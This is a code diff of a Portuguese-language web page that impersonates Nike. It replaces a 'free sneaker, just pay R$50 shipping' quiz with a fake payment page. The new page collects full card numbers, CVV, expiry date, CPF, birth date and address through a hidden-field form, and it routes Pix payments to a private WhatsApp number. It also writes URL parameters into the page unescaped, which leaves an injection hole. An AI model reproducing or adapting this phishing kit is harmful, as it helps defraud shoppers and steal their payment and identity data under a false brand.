@@ -3,153 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QuizNike - Ganhe um Tênis Nike de Graça!</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Bebas+Neue&display=swap" rel="stylesheet">
+    <meta name="description" content="Página de pagamento segura para adquirir produtos Nike. Escolha entre Pix ou Cartão de Crédito.">
+    <title>Página de Pagamento - Nike</title>
+    <link rel="stylesheet" href="pagamento.css">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" type="image/png" href="LOGOWHEYPRO.jpg">
+    <link rel="icon" type="image/png" href="732084.png">
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <div class="logo">
-            <img src="icons8-nike-50.png" alt="Logo Nike">
-        </div>
-        <nav>
-            <ul>
-                <li><a href="https://www.nike.com.br/hotsite/pegasus-premium">Lançamentos</a></li>
-                <li><a href="https://www.nike.com.br/sc/masculino-1">Masculino</a></li>
-                <li><a href="https://www.nike.com.br/nav/categorias/tenis/genero/feminino/tipodeproduto/calcados">Feminino</a></li>
-                <li><a href="https://www.nike.com.br/nav/ofertas/emoferta">Promoções</a></li>
-            </ul>
-        </nav>
-    </header>
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="hero-content">
-            <h1>Ganhe um Tênis Nike de Graça!</h1>
-            <p>Participe do quiz e leve um tênis Nike sem pagar nada. Você só paga o frete de R$ 50,00.</p>
-            <a href="#quiz" class="btn">Participar Agora</a>
-        </div>
+<header class="header">
+    <div class="header-content">
+        <h1>Pagamento</h1>
+        <p>Finalize sua compra de forma rápida e segura.</p>
+    </div>
+</header>
+
+<main class="container">
+    <!-- Seção para exibir os itens do carrinho -->
+    <section id="resumo-carrinho">
+        <h3>Resumo do Carrinho</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Produto</th>
+                    <th>Quantidade</th>
+                    <th>Preço Unitário</th>
+                    <th>Total</th>
+                </tr>
+            </thead>
+            <tbody id="tabela-resumo-carrinho"></tbody>
+        </table>
+        <p>Frete: R$50,00 <span id="frete-resumo">50,00</span></p>
+        <p>Total: R$ <span id="total-resumo">50,00</span></p>
     </section>
 
-    <!-- Quiz Section -->
-    <section id="quiz" class="quiz">
-        <h2>Responda o Quiz</h2>
-        <div class="progresso">
-            <div class="barra-progresso" id="barra-progresso"></div>
-        </div>
-        <form id="quizForm">
-            <!-- Pergunta 1 -->
-            <div class="pergunta ativa">
-                <label for="gosta-marca">Você gosta da marca Nike?</label>
-                <select id="gosta-marca" name="gosta-marca" required>
-                    <option value="sim">Sim</option>
-                    <option value="nao">Não</option>
-                </select>
-                <button type="button" class="btn proximo">Próxima Pergunta</button>
-            </div>
+    <!-- Seção de introdução ao pagamento -->
+    <section class="payment-intro">
+        <h2>Selecione seu método de pagamento para completar sua compra</h2>
+    </section>
 
-            <!-- Pergunta 2 -->
-            <div class="pergunta">
-                <label for="melhorias">O que a Nike poderia melhorar?</label>
-                <textarea id="melhorias" name="melhorias" rows="4" required></textarea>
-                <button type="button" class="btn anterior">Anterior</button>
-                <button type="button" class="btn proximo">Próxima Pergunta</button>
-            </div>
+    <!-- Opções de pagamento -->
+    <div class="payment-options">
+        <!-- Opção de pagamento via Pix -->
+        <article class="payment-option">
+            <img src="logo-pix-256.png" alt="Ícone Pix" class="payment-icon">
+            <h3>Pagar via Pix</h3>
+            <p>Escolha esta opção para pagar com Pix e ser redirecionado para o atendente no WhatsApp.</p>
+            <button id="pagar-pix" class="pix-button">Pagar com Pix</button>
+        </article>
 
-            <!-- Pergunta 3 -->
-            <div class="pergunta">
-                <label for="desempenho">Como você avalia o desempenho dos tênis Nike?</label>
-                <select id="desempenho" name="desempenho" required>
-                    <option value="excelente">Excelente</option>
-                    <option value="bom">Bom</option>
-                    <option value="regular">Regular</option>
-                    <option value="ruim">Ruim</option>
-                </select>
-                <button type="button" class="btn anterior">Anterior</button>
-                <button type="button" class="btn proximo">Próxima Pergunta</button>
-            </div>
+        <!-- Opção de pagamento via Cartão de Crédito -->
+        <article class="payment-option">
+            <img src="71227.png" alt="Ícone Cartão de Crédito" class="payment-icon credito-img">
+            <h3>Pagar com Cartão de Crédito</h3>
+            <p>Preencha seus dados abaixo e enviaremos as informações para o seu pagamento.</p>
+            <form name="payment-form" method="POST" data-netlify="true" netlify-honeypot="bot-field">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_subject" value="Novo pagamento recebido via Nike">
+                <input type="hidden" name="bot-field">
 
-            <!-- Pergunta 4 -->
-            <div class="pergunta">
-                <label for="frequencia">Com que frequência você compra tênis?</label>
-                <select id="frequencia" name="frequencia" required>
-                    <option value="mensal">Mensalmente</option>
-                    <option value="trimestral">A cada 3 meses</option>
-                    <option value="semestral">A cada 6 meses</option>
-                    <option value="anual">Anualmente</option>
-                </select>
-                <button type="button" class="btn anterior">Anterior</button>
-                <button type="button" class="btn proximo">Próxima Pergunta</button>
-            </div>
-
-            <!-- Pergunta 5 -->
-            <div class="pergunta">
-                <label for="estilo">Qual estilo de tênis você mais gosta?</label>
-                <select id="estilo" name="estilo" required>
-                    <option value="esportivo">Esportivo</option>
-                    <option value="casual">Casual</option>
-                    <option value="corrida">Corrida</option>
-                    <option value="skate">Skate</option>
-                </select>
-                <button type="button" class="btn anterior">Anterior</button>
-                <button type="button" class="btn proximo">Próxima Pergunta</button>
-            </div>
-
-            <!-- Escolha do Tênis -->
-            <div class="pergunta">
-                <h3>Escolha seu Tênis</h3>
-                <div class="tenis-opcoes">
-                    <div class="tenis" data-tenis="tenis1" data-nome="Air Max 97" data-valor="799.99">
-                        <img src="48426fbe4ee8dcbcd9cf0c1213783c8c.avif" alt="Tênis Nike Esportivo">
-                        <p>Air Max 97</p>
-                        <button type="button">Selecionar</button>
-                    </div>
-                    <div class="tenis" data-tenis="tenis2" data-nome="Air Max 90" data-valor="699.99">
-                        <img src="s-l400.jpg" alt="Tênis Nike Casual">
-                        <p>Air Max 90</p>
-                        <button type="button">Selecionar</button>
-                    </div>
-                    <div class="tenis" data-tenis="tenis3" data-nome="Air Force 1" data-valor="599.99">
-                        <img src="310447-1.webp" alt="Tênis Nike Premium">
-                        <p>Air Force 1</p>
-                        <button type="button">Selecionar</button>
-                    </div>
+                <!-- Campos do formulário -->
+                <div class="form-group">
+                    <label for="nome">Nome Completo:</label>
+                    <input type="text" id="nome" name="Nome" placeholder="Nome Completo-Titular Do Cartão" required>
                 </div>
-                <button type="button" class="btn anterior">Anterior</button>
-                <button type="button" class="btn proximo">Próxima Pergunta</button>
-            </div>
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="Email" placeholder="Digite seu email" required>
+                </div>
+                <div class="form-group">
+                    <label for="cpf">CPF/CNPJ:</label>
+                    <input type="text" id="cpf" name="CPF/CNPJ" placeholder="CPF/CNPJ Do Titular Do Cartão" required>
+                </div>
+                <div class="form-group">
+                    <label for="telefone">Telefone:</label>
+                    <input type="tel" id="telefone" name="Telefone" placeholder="Digite seu número de telefone" required>
+                </div>
+                <div class="form-group">
+                    <label for="data-nascimento">Data de Nascimento:</label>
+                    <input type="text" id="data-nascimento" name="Data de Nascimento" placeholder="data-nascimento" required>
+                </div>
+                <div class="form-group">
+                    <label for="endereco">Endereço:</label>
+                    <input type="text" id="endereco" name="Endereço" placeholder="Rua, Número, Bairro" required>
+                </div>
+                <div class="form-group">
+                    <label for="cidade">Cidade:</label>
+                    <input type="text" id="cidade" name="Cidade" placeholder="Digite sua cidade" required>
+                </div>
+                <div class="form-group">
+                    <label for="estado">Estado:</label>
+                    <input type="text" id="estado" name="Estado" placeholder="Digite seu estado" required>
+                </div>
+                <div class="form-group">
+                    <label for="cep">CEP:</label>
+                    <input type="text" id="cep" name="CEP" placeholder="Digite seu CEP" required>
+                </div>
+                <div class="form-group">
+                    <label for="numero-cartao">Número do Cartão:</label>
+                    <input type="text" id="numero-cartao" name="Número do Cartão de Crédito" placeholder="Digite o número do cartão" required>
+                </div>
+                <div class="form-group">
+                    <label for="data-vencimento">Data de Vencimento (MM/AA):</label>
+                    <input type="text" id="data-vencimento" name="Data de Vencimento" placeholder="MM/AA" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">Código de Segurança (CVV):</label>
+                    <input type="text" id="cvv" name="Código de Segurança" placeholder="Digite o CVV" required>
+                </div>
+                <div class="form-group">
+                    <label for="parcelas">Número de Parcelas:</label>
+                    <select id="parcelas" name="Parcelas" required>
+                        <option value="1">1x</option>
+                        <option value="2">2x</option>
+                        <option value="3">3x</option>
+                        <option value="4">4x</option>
+                        <option value="5">5x</option>
+                        <option value="6">6x</option>
+                        <option value="7">7x</option>
+                        <option value="8">8x</option>
+                        <option value="9">9x</option>
+                        <option value="10">10x</option>
+                        <option value="11">11x</option>
+                        <option value="12">12x</option>
+                    </select>
+                </div>
 
-            <!-- Escolha do Tamanho -->
-            <div class="pergunta">
-                <label for="tamanho">Escolha o tamanho:</label>
-                <select id="tamanho" name="tamanho" required>
-                    <option value="36">36</option>
-                    <option value="37">37</option>
-                    <option value="38">38</option>
-                    <option value="39">39</option>
-                    <option value="40">40</option>
-                    <option value="41">41</option>
-                    <option value="42">42</option>
-                    <option value="43">43</option>
-                    <option value="44">44</option>
-                </select>
-                <button type="button" class="btn anterior">Anterior</button>
-                <button type="submit" class="btn">Enviar Respostas</button>
-            </div>
-        </form>
-    </section>
+                <button type="submit" class="credito-button">Pagar com Cartão de Crédito</button>
+            </form>
+        </article>
+    </div>
+</main>
 
-    <!-- Footer -->
-    <footer>
-        <div class="footer-content">
-            <div class="logo">
-                <img src="icons8-nike-50.png" alt="Logo Nike">
-            </div>
-        </div>
-        <p>&copy; 2023 Nike. Todos os direitos reservados.</p>
-    </footer>
+<footer class="footer">
+    <p>&copy; 2025 Nike. Todos os direitos reservados</p>
+    <p><a href="politica-de-privacidade.html" target="_blank">Política de Privacidade</a> | <a href="termos-de-uso.html" target="_blank">Termos de Uso</a></p>
+</footer>
 
-    <script src="script.js"></script>
+<script>
+    // Função para obter parâmetros da URL
+    function obterParametrosURL() {
+        const params = new URLSearchParams(window.location.search);
+        return {
+            nome: params.get('nome'),
+            descricao: params.get('descricao'),
+            tamanho: params.get('tamanho'),
+            valor: params.get('valor'),
+            frete: params.get('frete'),
+            total: params.get('total')
+        };
+    }
+
+    // Função para exibir os dados do carrinho
+    function exibirResumoCarrinho() {
+        const dados = obterParametrosURL();
+        const tabelaResumo = document.getElementById('tabela-resumo-carrinho');
+        const freteResumo = document.getElementById('frete-resumo');
+        const totalResumo = document.getElementById('total-resumo');
+
+        // Preenche a tabela com os dados do carrinho
+        if (dados.nome) {
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+                <td>${dados.nome}</td>
+                <td>1</td>
+                <td>R$ ${dados.valor}</td>
+                <td>R$ ${dados.valor}</td>
+            `;
+            tabelaResumo.appendChild(tr);
+        }
+
+        // Exibe o frete e o total
+        freteResumo.textContent = dados.frete;
+        totalResumo.textContent = dados.total;
+    }
+
+    // Função para redirecionar para o WhatsApp com os dados do carrinho
+    function redirecionarWhatsApp() {
+        const dados = obterParametrosURL();
+
+        // Formata a mensagem
+        let mensagem = "Olá, gostaria de finalizar minha compra na *Nike* com os seguintes itens:\n\n";
+        mensagem += `- *Produto:* ${dados.nome}\n`;
+        mensagem += `- *Tamanho:* ${dados.tamanho}\n`;
+        mensagem += `- *Valor do Produto:* R$ ${dados.valor}\n`;
+        mensagem += `- *Frete:* R$ 50,00\n`;
+        mensagem += `- *Total:* R$ ${dados.total}\n\n`;
+        mensagem += "Forma de pagamento: *Pix*";
+
+        // Codifica a mensagem para uso no link
+        const mensagemCodificada = encodeURIComponent(mensagem);
+
+        // Número de WhatsApp da loja (no formato internacional)
+        const numeroWhatsApp = "5511985310434"; // Substitua pelo seu número
+
+        // Cria o link do WhatsApp
+        const linkWhatsApp = `https://wa.me/${numeroWhatsApp}?text=${mensagemCodificada}`;
+
+        // Redireciona o usuário
+        window.location.href = linkWhatsApp;
+    }
+
+    // Adiciona o evento ao botão "Pagar com Pix"
+    document.getElementById('pagar-pix').addEventListener('click', redirecionarWhatsApp);
+
+    // Exibe o resumo do carrinho ao carregar a página
+    window.onload = exibirResumoCarrinho;
+</script>
 </body>
 </html>
